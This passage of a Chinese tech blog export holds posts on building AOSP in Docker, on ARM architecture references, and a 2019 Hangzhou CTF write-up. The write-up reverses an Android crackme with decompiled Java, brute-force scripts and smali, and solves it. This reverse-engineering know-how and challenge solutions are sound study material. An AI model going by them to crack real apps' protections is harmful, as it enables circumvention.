<h2 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h2><p><a href="https://developer.arm.com/documentation/ddi0557/latest/">ARM Architecture Reference Manual Supplement ARMv8.1, for ARMv8-A architecture profile</a></p>
<p><code>B11.1 Alphabetical list of instructions</code></p>
]]></content>
      <tags>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>使用docker编译安卓源码</title>
    <url>/2020/04/16/aosp-docker/</url>
    <content><![CDATA[<h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p><a href="https://blog.xhyeax.com/2020/04/15/wsl2-docker/">在WSL2(Ubuntu 18.04)中安装docker并配置自启动</a></p>
<h3 id="配置docker源"><a href="#配置docker源" class="headerlink" title="配置docker源"></a>配置docker源</h3><p>使用阿里云的加速服务，解决下载镜像速度慢的问题<br>打开<a href="https://cr.console.aliyun.com/">容器镜像服务</a><br>镜像中心 - 镜像加速器<br>将加速器地址写入<code>/etc/docker/daemon.json</code>，格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://xxxxxx.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><p>编译安卓5.0到6.0，则克隆<code>android-5</code>分支</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/XhyEax/docker-aosp -b android-5</span><br></pre></td></tr></table></figure>
<p>7.0及以上直接克隆即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/XhyEax/docker-aosp</span><br></pre></td></tr></table></figure>
<h3 id="配置源码保存路径（可选）"><a href="#配置源码保存路径（可选）" class="headerlink" title="配置源码保存路径（可选）"></a>配置源码保存路径（可选）</h3><p>默认保存到<code>~/aosp-root</code> (即<code>/root/aosp-root</code>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export AOSP_VOL=~/Android/</span><br></pre></td></tr></table></figure>
<p>也可修改<code>aosp</code>中的<code>AOSP_VOL</code></p>
<h3 id="手动配置镜像版本（可选）"><a href="#手动配置镜像版本（可选）" class="headerlink" title="手动配置镜像版本（可选）"></a>手动配置镜像版本（可选）</h3><p>以编译6.0系统为例，修改<code>aosp</code>的第十二行为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AOSP_IMAGE=$&#123;AOSP_IMAGE:-kylemanna/aosp:5.0-lolipop&#125;</span><br></pre></td></tr></table></figure>
<p>所有tag：<a href="https://hub.docker.com/r/kylemanna/aosp/tags">dockerhub kylemanna/aosp tags</a></p>
<h3 id="启动容器-进入bash"><a href="#启动容器-进入bash" class="headerlink" title="启动容器 进入bash"></a>启动容器 进入bash</h3><p>用于测试文件夹映射是否正确，进入后执行<code>ls</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./aosp</span><br></pre></td></tr></table></figure>
<p><strong>注意：不要执行<code>exit</code>，会关闭容器。使用<code>Ctrl+P+Q</code>从容器中Detach即可</strong></p>
<h3 id="以root用户进入bash"><a href="#以root用户进入bash" class="headerlink" title="以root用户进入bash"></a>以root用户进入bash</h3><p>用于编译系统</p>
<h4 id="使用VSCode-Docker插件（推荐）"><a href="#使用VSCode-Docker插件（推荐）" class="headerlink" title="使用VSCode Docker插件（推荐）"></a>使用VSCode Docker插件（推荐）</h4><p>在<code>VSCode</code>中安装<code>Docker</code>插件后，在<code>Containers</code>中右键打开的<code>aosp</code>容器，<code>Attach Shell</code></p>
<h4 id="使用命令行"><a href="#使用命令行" class="headerlink" title="使用命令行"></a>使用命令行</h4><h5 id="查询容器id"><a href="#查询容器id" class="headerlink" title="查询容器id"></a>查询容器id</h5><p>启动docker容器后，复制容器id（用户名后面的字符）<br>也可以使用<code>docker ps</code>查询<br>（下面是使用命令提取出第一个容器id）</p>
<h5 id="登录bash"><a href="#登录bash" class="headerlink" title="登录bash"></a>登录bash</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cid=$(docker ps | grep aosp | cut -d&quot; &quot; -f1) &amp;&amp; echo $cid</span><br><span class="line">docker exec --privileged -u root -it $cid bash</span><br></pre></td></tr></table></figure>
<h3 id="已有源码：直接编译系统"><a href="#已有源码：直接编译系统" class="headerlink" title="已有源码：直接编译系统"></a>已有源码：直接编译系统</h3><p>进入容器的bash后，打开源码目录，执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prebuilts/misc/linux-x86/ccache/ccache -M 100G</span><br><span class="line">source build/envsetup.sh</span><br><span class="line">lunch aosp_arm-eng</span><br><span class="line">cpus=$(grep ^processor /proc/cpuinfo | wc -l)</span><br><span class="line">make -j $[2*$cpus]</span><br></pre></td></tr></table></figure>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>如果需要编译手机（如nexus5）使用的系统镜像，还需要下载驱动文件。<br>见：<a href="https://blog.xhyeax.com/2019/12/29/ubuntu-1910-android-6-source/">Ubuntu 19.10 编译安卓6.0.0_r1源码</a><br>并修改脚本中的<code>aosp_arm-eng</code>为<code>aosp_hammerhead-userdebug</code></p>
<h3 id="无源码：下载源码并编译"><a href="#无源码：下载源码并编译" class="headerlink" title="无源码：下载源码并编译"></a>无源码：下载源码并编译</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd tests</span><br><span class="line">bash ./build-aosp.sh</span><br></pre></td></tr></table></figure>
<p>该脚本下载的是<code>android-6.0.0_r1</code>的代码，编译目标为<code>aosp_arm-eng</code>，如需更换请自行修改脚本</p>
<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p><code>docker ps</code>找到容器id，执行<code>docker rm -f 容器id</code>删除</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/tiann/docker-aosp">tiann/docker-aosp</a><br><a href="https://www.cnblogs.com/asminfo/p/6789258.html">使用docker创建aosp编译环境</a><br><a href="https://blog.csdn.net/weixin_43569697/article/details/89279225">docker下载镜像太慢的解决方案</a><br><a href="https://www.jianshu.com/p/b1ce248d2a42">Docker退出容器不关闭容器的方法</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Linux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>2019中国杭州网络安全技能大赛 预选赛 哈夫曼之谜 &amp; EasyCpp Writeup</title>
    <url>/2019/04/07/2019-hzwas-wp/</url>
    <content><![CDATA[<h2 id="Reverse-EasyCpp"><a href="#Reverse-EasyCpp" class="headerlink" title="Reverse EasyCpp"></a>Reverse EasyCpp</h2><p>[2019/10/25更新]<br>首先读入16个数字，然后生成一个斐波那契数组，长度也为16<br>然后对输入数组进行操作，从第二位开始，都加上第一位的值（<code>transform</code>）<br>动态调试可知<code>accumulate</code>的匿名函数对运算完的数组做反转操作<br>然后与斐波那契数组比较，相同则输出flag<br>也就是说输入的第一个数字是不会变的，所以就是987<br>后面的数字直接脚本跑一下就可以得到结果了</p>
<span id="more"></span>
<h2 id="Crypto-哈夫曼之谜-100pt"><a href="#Crypto-哈夫曼之谜-100pt" class="headerlink" title="Crypto 哈夫曼之谜 100pt"></a>Crypto 哈夫曼之谜 100pt</h2><p>二叉树是真的还没学，还好找到了大佬的代码<br><a href="https://blog.csdn.net/zl1085372438/article/details/54694552">南邮数据结构实验二—二叉树的基本操作及哈夫曼编码译码系统的实现</a></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>得到一个文本，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110</span><br><span class="line"></span><br><span class="line">a:4</span><br><span class="line">d:9</span><br><span class="line">g:1</span><br><span class="line">f:5</span><br><span class="line">l:1</span><br><span class="line">0:7</span><br><span class="line">5:9</span><br><span class="line">&#123;:1</span><br><span class="line">&#125;:1</span><br></pre></td></tr></table></figure>
<p>由题意知， 使用了哈夫曼编码。所以上面的是二进制编码，下面的是词频<br>使用大佬的程序生成哈夫曼树，再解码得到flag。<br>因为5和d词频一样，如果flag不对，两者替换一下就行了<br>（原来这题只要提交flag{}里面的字符，难怪我提交2次都错了 = =）</p>
<h2 id="Misc-crackme-300pt"><a href="#Misc-crackme-300pt" class="headerlink" title="Misc crackme 300pt"></a>Misc crackme 300pt</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这是一道安卓逆向题，反编译后修改apk主入口为CokeyActivity，进入输入用户名和密码的界面。<br>（默认进入的界面是GameActivity，该游戏基于js编写，代码加密，对这块不熟，所以直接分析另一个Activity）<br>分析代码可知用户名需为<code>Conan</code>，密码则需要将明文处理一番后与<code>950519fec04js3mjtyioqbwxoshxvbprsjir1miy536kHp6GbGiTfL6GckiKfcUG0PzjFgijHmikAr-DUm39096000030240</code>相等，生成密文的函数代码为(JEB2提取):</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(String arg18, <span class="keyword">int</span> arg19)</span> </span>&#123;</span><br><span class="line">        String v0 = arg18.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v2 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(v0.length() &gt;= v2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(v0.length() &gt; <span class="number">99</span>) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                String v1 = <span class="string">&quot;IVMDy5x1A0ali-O|fbnKEHjTUQz86oqdNewCvPGX4utJ3SZ9cLR2gmpkFrh7WsYB|da6202b5FA5fF510702092e729A3afN8&quot;</span>;</span><br><span class="line">                Random v3 = <span class="keyword">new</span> Random();</span><br><span class="line">                StringBuilder v4 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String v5 = <span class="string">&quot;950519&quot;</span>;</span><br><span class="line">                <span class="keyword">int</span> v6 = v0.length();</span><br><span class="line">                StringBuilder v8 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                v8.append(System.currentTimeMillis());</span><br><span class="line">                v8.append(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> v10 = <span class="number">2</span>;</span><br><span class="line">                String v8_1 = v8.toString().substring(v10, <span class="number">4</span>);</span><br><span class="line">                StringBuilder v9 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                v9.append(System.currentTimeMillis());</span><br><span class="line">                v9.append(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                String v9_1 = v9.toString().substring(<span class="number">6</span>, <span class="number">8</span>);</span><br><span class="line">                String v13_1 = (((<span class="keyword">int</span>)(Math.random() * <span class="number">5</span>))) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">int</span> v14 = <span class="number">0</span>;</span><br><span class="line">                String v15 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">int</span> v7;</span><br><span class="line">                <span class="keyword">for</span>(v7 = <span class="number">0</span>; v7 &lt; v6; ++v7) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v12 = v0.charAt(v7);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">47</span> &lt; v12 &amp;&amp; v12 &lt; <span class="number">58</span>) &#123; <span class="comment">//数字</span></span><br><span class="line">                        v12 = (v12 - <span class="number">48</span> + Integer.parseInt(v8_1) + v7 * v7 % arg19) % v2 + <span class="number">48</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">64</span> &lt; v12 &amp;&amp; v12 &lt; <span class="number">91</span>) &#123; <span class="comment">//大写字母</span></span><br><span class="line">                        v12 = (v12 - <span class="number">65</span> + Integer.parseInt(v9_1) + v7 * v7 % arg19) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(<span class="number">96</span> &lt; v12 &amp;&amp; v12 &lt; <span class="number">123</span>) &#123; <span class="comment">//小写字母</span></span><br><span class="line">                        v12 = (v12 - <span class="number">97</span> + Integer.parseInt(v13_1) + v7 * v7 % arg19) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v15 = v15 + (((<span class="keyword">char</span>)v12));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> v0_1 = v15.length();</span><br><span class="line">                v2 = v3.nextInt(v0_1 - <span class="number">1</span>);</span><br><span class="line">                String v3_1 = v15.substring(<span class="number">0</span>, v2);</span><br><span class="line">                v0 = v15.substring(v2, v0_1);</span><br><span class="line">                v0 = v5 + v0 + v8_1;</span><br><span class="line">                <span class="keyword">for</span>(v3_1 = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, v3_1.getBytes(<span class="string">&quot;UTF-8&quot;</span>)).toString(v10); v3_1.length() % <span class="number">8</span> != <span class="number">0</span>; v3_1 = <span class="string">&quot;0&quot;</span> + v3_1) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v5_1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                v5_1.append(v6 + arg19);</span><br><span class="line">                v5_1.append(String.format(<span class="string">&quot;%06d&quot;</span>, Integer.valueOf(v2)));</span><br><span class="line">                StringBuilder v2_1 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                v2_1.append(v6);</span><br><span class="line">                v2_1.append(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                v5_1.append(v2_1.toString().length());</span><br><span class="line">                String v2_2 = v5_1.toString();</span><br><span class="line">                <span class="keyword">int</span> v5_2;</span><br><span class="line">                <span class="keyword">for</span>(v5_2 = <span class="number">0</span>; v3_1.length() % <span class="number">24</span> != <span class="number">0</span>; ++v5_2) &#123;</span><br><span class="line">                    v3_1 = v3_1 + <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(v14 &lt;= v3_1.length() - <span class="number">6</span>) &#123;</span><br><span class="line">                    v6 = v14 + <span class="number">6</span>;</span><br><span class="line">                    <span class="keyword">int</span> v8_2 = Integer.parseInt(v3_1.substring(v14, v6), v10);</span><br><span class="line">                    <span class="keyword">if</span>(v8_2 != <span class="number">0</span> || v14 &lt; v3_1.length() - v5_2) &#123;</span><br><span class="line">                        v4.append(v1.charAt(v8_2));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        v4.append(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v14 = v6;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v1 = v4.toString();</span><br><span class="line">                <span class="keyword">return</span> v0 + v1 + v9_1 + v13_1 + v2_2 + v1.length();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析代码逻辑"><a href="#分析代码逻辑" class="headerlink" title="分析代码逻辑"></a>分析代码逻辑</h3><p>可以看到其中有取时间戳，随机数生成，所以我们需要把这些固定下来。</p>
<p>分析Java代码可知密文结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">950519 fec04js3mjtyioqbwxoshxvbprsjir1miy 53 6kHp6GbGiTfL6GckiKfcUG0PzjFgijHmikAr-DUm 39 0 96 000030 2 40</span><br><span class="line">固定前缀  sec1 时间戳取2-4位 sec2 时间戳取6-8位  5以内随机数 明文长度+32 明文位数-1内取随机数再补0至6位 固定数值（明文长度的长度） sec2长度</span><br></pre></td></tr></table></figure>
<p>sec1: 30-64位替换结果<br>sec2: 0-30位替换后再处理结果<br>分析完密文结构可知，明文长度为64位（96-32）<br>sec2生成具体流程为：<br>将密文进行逐字替换（所处位置不同，替换结果也不同）。<br>然后取前30位，逐位转化为二进制，除第一项外，其余项目前面补0至八位，再末尾补0至24的倍数<br>每六位作为二进制数，转化为十进制，读取指定字符串的该位置字符，再拼接成字符串<br>所以我们需要逆向求解得到替换的结果（中间密文），再爆破解得原始明文</p>
<h3 id="抽取替换代码为函数"><a href="#抽取替换代码为函数" class="headerlink" title="抽取替换代码为函数"></a>抽取替换代码为函数</h3><p>为爆破做准备</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">getRet</span> <span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> index )</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">47</span> &lt; x &amp;&amp; x &lt; <span class="number">58</span>) &#123;<span class="comment">//数字</span></span><br><span class="line">        x = (x - <span class="number">48</span> + <span class="number">53</span> + index * index % <span class="number">32</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">64</span> &lt; x &amp;&amp; x &lt; <span class="number">91</span>) &#123;<span class="comment">//大写字母</span></span><br><span class="line">        x = (x - <span class="number">65</span> + <span class="number">39</span> + index * index % <span class="number">32</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">96</span> &lt; x &amp;&amp; x &lt; <span class="number">123</span>) &#123;<span class="comment">//小写字母</span></span><br><span class="line">        x = (x - <span class="number">97</span> + <span class="number">0</span> + index * index % <span class="number">32</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">char</span>)x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>首先我们需要求到前30位，写个python脚本就可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="string">&quot;6kHp6GbGiTfL6GckiKfcUG0PzjFgijHmikAr-DUm&quot;</span>;</span><br><span class="line">v1 = <span class="string">&quot;IVMDy5x1A0ali-O|fbnKEHjTUQz86oqdNewCvPGX4utJ3SZ9cLR2gmpkFrh7WsYB|da6202b5FA5fF510702092e729A3afN8&quot;</span>;</span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f)):</span><br><span class="line">    tmp = f[i]</span><br><span class="line">    loc = v1.index(tmp)</span><br><span class="line">    s += <span class="built_in">str</span>(<span class="built_in">bin</span>(loc)).replace(<span class="string">&quot;0b&quot;</span>,<span class="string">&quot;&quot;</span>).rjust(<span class="number">6</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到<code>011100110111010101110110011100100110010001100110001100010111010000110001011100100110110000110111001100010011010000110000011000100110001001100101011010010110111000110100001100010110010101110101001100110111001000111001001101000011011000110101</code><br>然后把它转成十进制 (去掉了开头的0)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ret = <span class="string">&quot;&quot;</span></span><br><span class="line">s = <span class="string">&quot;11100110111010101110110011100100110010001100110001100010111010000110001011100100110110000110111001100010011010000110000011000100110001001100101011010010110111000110100001100010110010101110101001100110111001000111001001101000011011000110101&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    ttt = s[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#print(ttt)</span></span><br><span class="line">    ret += <span class="built_in">chr</span>(<span class="built_in">int</span>(ttt,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure>
<p>得到<code>suvrdf1t1rl7140bbein41eu3r9465</code><br>这就是中间密文得前30位，而后34位则是<code>fec04js3mjtyioqbwxoshxvbprsjir1miy</code>，拼接起来爆破即可(Java)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String interStr = <span class="string">&quot;suvrdf1t1rl7140bbein41eu3r9465fec04js3mjtyioqbwxoshxvbprsjir1miy&quot;</span>;</span><br><span class="line">               StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">               <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;interStr.length();i++) &#123;</span><br><span class="line">                   <span class="keyword">char</span> ta = interStr.charAt(i);</span><br><span class="line">                   <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">48</span>;j&lt;<span class="number">123</span>;j++) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(getRet(j,i) == ta)</span><br><span class="line">                       sb.append((<span class="keyword">char</span>)(j));</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               Log.d(<span class="string">&quot;Xhy&quot;</span>,sb.toString());</span><br></pre></td></tr></table></figure>
<p>得到<code>string4c8ah9223abdee53ad0a2673bdc67ac5isthepasswordofclasses2dex</code><br>所以这只是第一步，<code>assets\vendor\multidex</code>下有个拓展名为dex的zip文件，使用<code>4c8ah9223abdee53ad0a2673bdc67ac5</code>解压。<br>里面有个<code>Cokey.smali</code>文件，调用了native方法qwert</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.field private qwert_param1:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">.field private qwert_param2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">.method static constructor &lt;clinit&gt;()V</span><br><span class="line">    .locals 1</span><br><span class="line"></span><br><span class="line">    .line 14</span><br><span class="line">    const-string v0, <span class="string">&quot;cokey&quot;</span></span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line 15</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method public constructor &lt;init&gt;()V</span><br><span class="line">    .locals 1</span><br><span class="line"></span><br><span class="line">    .line 8</span><br><span class="line">    invoke-direct &#123;p0&#125;, Landroid/support/v7/app/AppCompatActivity;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line 10</span><br><span class="line">    const-string v0, <span class="string">&quot;from CokeyActivity&quot;</span></span><br><span class="line"></span><br><span class="line">    iput-object v0, p0, Lxyz/sysorem/cokey/Cokey;-&gt;qwert_param1:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line 11</span><br><span class="line">    const-string v0, <span class="string">&quot;from GameActivity&quot;</span></span><br><span class="line"></span><br><span class="line">    iput-object v0, p0, Lxyz/sysorem/cokey/Cokey;-&gt;qwert_param2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method public onCreate(Landroid/os/Bundle;Landroid/os/PersistableBundle;)V</span><br><span class="line">    .locals 0</span><br><span class="line">    .param p1, <span class="string">&quot;savedInstanceState&quot;</span>    <span class="comment"># Landroid/os/Bundle;</span></span><br><span class="line">        .annotation build Landroid/support/annotation/Nullable;</span><br><span class="line">        .end annotation</span><br><span class="line">    .end param</span><br><span class="line">    .param p2, <span class="string">&quot;persistentState&quot;</span>    <span class="comment"># Landroid/os/PersistableBundle;</span></span><br><span class="line">        .annotation build Landroid/support/annotation/Nullable;</span><br><span class="line">        .end annotation</span><br><span class="line">    .end param</span><br><span class="line"></span><br><span class="line">    .line 20</span><br><span class="line">    invoke-super &#123;p0, p1, p2&#125;, Landroid/support/v7/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;Landroid/os/PersistableBundle;)V</span><br><span class="line"></span><br><span class="line">    .line 21</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.method public native qwert(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以新建一个工程，包名跟原程序一样，修改MainActivity为CokeyActivity，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xyz.sysorem.cokey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CokeyActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> String parm1=<span class="string">&quot;from CokeyActivity&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> String parm2=<span class="string">&quot;from GameActivity&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        String s = qwert(parm1,parm2);</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>,s,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;cokey&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">qwert</span><span class="params">(String s1,String s2)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行试试，返回<code>真実はいつもひとつ !</code>(真相只有一个)，果然没那么简单。<br>ida打开<code>libcokey.so</code>，在<code>JNI_OnLoad</code>注册了qwert方法，指向ready，打开该方法，有获取签名和从证书中读取公钥的操作。并存在对时间戳和随机数的调用，所以需要通过修改跳转来修改程序执行流程。<br>然后根据一系列操作生成aes_key进行AES解密操作（eee函数），再调用aaa, bbb函数进行转换，目测是转化成16进制字符串<br>所以关键就在于，如何得到正确的密文和aeskey来进行后续的解密操作<br>注意到ready函数中有对mystery进行赋值的操作，所以推测mystery即为密文<br>时间所限，剩下的以后再看吧（逃</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>armv7 A R M版本区别</title>
    <url>/2021/11/28/arm-v7-a-r-m/</url>
    <content><![CDATA[<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://developer.arm.com/documentation/ddi0406/latest/">ARM Architecture Reference Manual ARMv7-A and ARMv7-R edition</a></p>
<p><code>A1.3 Architecture versions, profiles, and variants</code></p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The ARM architecture has evolved significantly since its introduction, and ARM continues to develop it. Seven </span><br><span class="line">major versions of the architecture have been defined to date, denoted by the version numbers 1 to 7. Of these, the </span><br><span class="line">first three versions are now obsolete.</span><br><span class="line">ARMv7 provides three profiles:</span><br><span class="line">ARMv7-A Application profile, described in this manual:</span><br><span class="line">• Implements a traditional ARM architecture with multiple modes.</span><br><span class="line">• Supports a Virtual Memory System Architecture (VMSA) based on a Memory Management </span><br><span class="line">Unit (MMU). An ARMv7-A implementation can be called a VMSAv7 implementation.</span><br><span class="line">• Supports the ARM and Thumb instruction sets.</span><br><span class="line">ARMv7-R Real-time profile, described in this manual:</span><br><span class="line">• Implements a traditional ARM architecture with multiple modes.</span><br><span class="line">• Supports a Protected Memory System Architecture (PMSA) based on a Memory Protection </span><br><span class="line">Unit (MPU). An ARMv7-R implementation can be called a PMSAv7 implementation.</span><br><span class="line">• Supports the ARM and Thumb instruction sets.</span><br><span class="line">ARMv7-M Microcontroller profile, described in the ARMv7-M Architecture Reference Manual:</span><br><span class="line">• Implements a programmers&#x27; model designed for low-latency interrupt processing, with </span><br><span class="line">hardware stacking of registers and support for writing interrupt handlers in high-level </span><br><span class="line">languages.</span><br><span class="line">• Implements a variant of the ARMv7 PMSA.</span><br><span class="line">• Supports a variant of the Thumb instruction set. </span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM Thumb状态下 相对pc寄存器寻址问题</title>
    <url>/2021/08/03/arm-thumb-pc-address/</url>
